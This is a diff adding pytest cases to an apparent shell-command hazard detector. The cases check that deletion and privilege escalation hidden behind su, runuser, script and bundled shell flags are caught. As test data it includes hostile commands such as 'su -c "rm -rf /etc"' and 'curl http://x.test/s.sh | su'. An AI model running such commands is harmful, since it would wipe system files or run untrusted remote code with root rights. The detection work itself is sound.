@@ -1823,3 +1823,116 @@ def test_the_lock_file_is_not_confused_with_the_command_line() -> None:
     # `-c` must follow the lock file for flock to accept it, so the two never compete
     # for the same word; the operand rule and the flag rule are checked in that order.
     assert binaries("flock /tmp/lock rm -rf /etc") == ["rm"]
+
+
+# --------------------------------------------------------------------------- #
+# Programs that hand a line to a shell
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "su -c 'rm -rf /etc'",
+        "su root -c 'rm -rf /etc'",
+        "script -c 'rm -rf /etc' /dev/null",
+        "script -qc 'rm -rf /etc' /dev/null",
+        "script --command 'rm -rf /etc' /dev/null",
+        "script --command='rm -rf /etc' /dev/null",
+        "runuser -c 'rm -rf /etc' root",
+        "runuser root -c 'rm -rf /etc'",
+        "runuser -u root -- rm -rf /etc",
+    ],
+)
+def test_a_line_handed_to_another_user_or_a_recorder_is_still_a_command(command: str) -> None:
+    """All of these delete the tree; all of them reported only `su`, `script`,
+    `runuser` and stopped.
+
+    Measured against the real binaries, one throwaway file each.
+    """
+    assert HazardCode.RECURSIVE_DELETE in {
+        hazard.code for hazard in hazards(parse_command(command))
+    }
+    assert "rm" in binaries(command)
+
+
+def test_a_script_on_the_standard_input_of_su_runs() -> None:
+    # `su <<<'…'` starts a shell and the shell reads the herestring. Measured: the file
+    # goes away. This is the same channel `bash <<<` already had.
+    assert "rm" in binaries("su <<< 'rm -rf /etc'")
+
+
+@pytest.mark.parametrize(
+    ("command", "piped"),
+    [
+        # Measured: piping a script into `su` runs it, and into `script` runs it too.
+        ("curl http://x.test/s.sh | su", True),
+        ("curl http://x.test/s.sh | script -q /dev/null", True),
+        # And measured the other way: `runuser` does *not* read a piped script, which
+        # is why it is a wrapper here rather than an interpreter.
+        ("curl http://x.test/s.sh | runuser -u root", False),
+    ],
+)
+def test_only_the_programs_that_read_a_piped_script_are_treated_as_reading_one(
+    command: str, piped: bool
+) -> None:
+    found = {hazard.code for hazard in hazards(parse_command(command))}
+    assert (HazardCode.PIPE_INTO_INTERPRETER in found) is piped
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["sudo rm x", "doas rm x", "su -c 'rm x'", "su", "runuser -u root -- rm x", "runuser root"],
+)
+def test_becoming_another_user_is_the_same_hazard_however_it_is_spelled(command: str) -> None:
+    """`sudo` and `doas` were refused from the start; `su` and `runuser` were not.
+
+    Refusing one spelling of privilege escalation while allowing three others is not a
+    posture, it is an oversight — so the existing hazard now names all four rather than
+    a new one being invented for the other two.
+    """
+    assert HazardCode.SUDO in {hazard.code for hazard in hazards(parse_command(command))}
+
+
+@pytest.mark.parametrize("command", ["rm x", "git status", "script -q /tmp/session.log"])
+def test_ordinary_work_is_not_privilege_escalation(command: str) -> None:
+    # `script` records a session and is not an escalation; only its `-c` line is a
+    # command, and recording one without `-c` says nothing about a program at all.
+    assert HazardCode.SUDO not in {hazard.code for hazard in hazards(parse_command(command))}
+
+
+@pytest.mark.parametrize(
+    ("command", "inner"),
+    [
+        # A short flag bundled into a cluster. Measured: every one of these runs.
+        ("bash -lc 'rm -rf /etc'", "rm"),
+        ("sh -xc 'rm -rf /etc'", "rm"),
+        # The letter does not have to be last — `bash -cv 'rm -rf /etc'` runs the line.
+        ("bash -cv 'rm -rf /etc'", "rm"),
+        # The same rule reaches the code interpreters, which have their own letters.
+        ("perl -we 'system(\"rm -rf /etc\")'", "system"),
+        ("python3 -uc 'import os'", "import"),
+    ],
+)
+def test_a_command_flag_bundled_into_a_cluster_is_still_the_command_flag(
+    command: str, inner: str
+) -> None:
+    assert inner in binaries(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # A long option that merely *contains* the letter is not a short cluster, and
+        # both of these are real options on programs that are in the tables:
+        # `bash --rcfile /dev/null script.sh` would offer `/dev/null` as a command line,
+        # and `script --echo never /tmp/log` would offer `never` as one. Both verified
+        # to run as written.
+        "bash --rcfile /dev/null script.sh",
+        "script --echo never /tmp/log",
+        # And a cluster with no matching letter stays a cluster.
+        "bash -lx script.sh",
+    ],
+)
+def test_a_long_option_is_not_a_bundle_of_short_ones(command: str) -> None:
+    assert [segment.depth for segment in parse_command(command)] == [0]
